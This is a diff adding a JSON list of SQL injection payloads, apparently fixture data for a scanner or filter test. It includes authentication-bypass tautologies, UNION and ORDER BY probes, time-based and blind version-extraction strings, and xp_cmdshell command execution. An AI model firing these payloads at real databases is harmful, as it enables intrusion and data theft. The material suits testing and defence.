+    "payload_type": "0",
+    "payload_text": ")) or pg_sleep(__TIME__)--\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "?",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 1/*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "!",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or a = a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "declare @q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "declare @s varchar(200) select @s = 0x77616974666F722064656C61792027303A303A31302700 exec(@s)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00 exec(@q)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "declare @s varchar (200) select @s = 0x73656c65637420404076657273696f6e exec(@s)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or 1=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "\u0018 or 1=1 --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "x' OR full_name LIKE '%Bob%",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "'; exec master..xp_cmdshell 'ping 172.10.1.255'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "'%20or%20''='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "'%20or%20'x'='x",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "')%20or%20('x'='x",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or 0=0 --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or 0=0 #",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 0=0 #\"",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or '1'='1'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or 1 --'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or 1=1 or ''='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or 1=1 or \"\"=",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or a=a--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " or a=a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "') or ('a'='a",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "'hi' or 'x'='x';",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "or",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "procedure",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "handler",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or username like '%",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or uname like '%",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or userid like '%",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or uid like '%",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or user like '%",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "'; exec master..xp_cmdshell",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "'; exec xp_regread",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "t'exec master..xp_cmdshell 'nslookup www.google.com'--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' UNION SELECT",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' UNION ALL SELECT",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or (EXISTS)",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' (select top 1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "'||UTL_HTTP.REQUEST",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "1;SELECT%20*",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "<>\"'%;)(&+",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "'%20or%201=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "'sqlattempt1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "29%",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "26%",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or ''='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or 3=3",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "' or 3=3 --",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "OR 1=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR 1=0",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR x=x",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR x=y",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR 1=1#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR 1=0#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR x=x#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR x=y#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR 1=0--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR x=x--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR x=y--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR 3409=3409 AND ('pytW' LIKE 'pytW",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " OR 3409=3409 AND ('pytW' LIKE 'pytY",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " HAVING 1=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " HAVING 1=0",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " HAVING 1=1#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " HAVING 1=0#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " HAVING 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " HAVING 1=0--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 1=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 1=0",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 1=0--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 1=1#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 1=0#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 1=1 AND '%'='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 1=0 AND '%'='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 1083=1083 AND (1427=1427",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 7506=9091 AND (5913=5913",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 1083=1083 AND ('1427=1427",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 7506=9091 AND ('5913=5913",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 7300=7300 AND 'pKlZ'='pKlZ",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 7300=7300 AND 'pKlZ'='pKlY",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 7300=7300 AND ('pKlZ'='pKlZ",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AND 7300=7300 AND ('pKlZ'='pKlY",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AS INJECTX WHERE 1=1 AND 1=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AS INJECTX WHERE 1=1 AND 1=0",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AS INJECTX WHERE 1=1 AND 1=1#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AS INJECTX WHERE 1=1 AND 1=0#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AS INJECTX WHERE 1=1 AND 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " AS INJECTX WHERE 1=1 AND 1=0--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " WHERE 1=1 AND 1=1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " WHERE 1=1 AND 1=0",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " WHERE 1=1 AND 1=1#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " WHERE 1=1 AND 1=0#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " WHERE 1=1 AND 1=1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " WHERE 1=1 AND 1=0--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 1--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 2--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 3--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 4--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 5--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 6--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 7--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 8--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 9--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 10--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 11--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 12--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 13--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 14--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 15--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 16--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 17--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 18--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 19--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 20--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 21--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 22--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 23--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 24--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 25--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 26--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 27--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 28--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 29--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 30--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 31337--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 1#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 2#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 3#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 4#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 5#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 6#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 7#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 8#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 9#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 10#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 11#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 12#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 13#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 14#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 15#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 16#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 17#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 18#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 19#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 20#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 21#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 22#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 23#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 24#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 25#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 26#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 27#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 28#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 29#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 30#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 31337#",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 1",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 2",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 3",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 4",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 5",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 6",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 7",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 8",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 9",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 10",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 11",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 12",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 13",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 14",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 15",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 16",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 17",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 18",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 19",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 20",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 21",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 22",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 23",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 24",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 25",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 26",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 27",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 28",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 29",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 30",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " ORDER BY 31337",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "IF(7423=7424) SELECT 7423 ELSE DROP FUNCTION xcjl--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%' AND 8310=8310 AND '%'='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": "%' AND 8310=8311 AND '%'='",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " and (select substring(@@version,1,1))='X'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " and (select substring(@@version,1,1))='M'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " and (select substring(@@version,2,1))='i'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " and (select substring(@@version,2,1))='y'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " and (select substring(@@version,3,1))='c'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " and (select substring(@@version,3,1))='S'",
+    "expected_fail": false,
+    "valid": true
+  },
+  {
+    "payload_type": "0",
+    "payload_text": " and (select substring(@@version,3,1))='X'",
+    "expected_fail": false,
+    "valid": true
+  }
+]
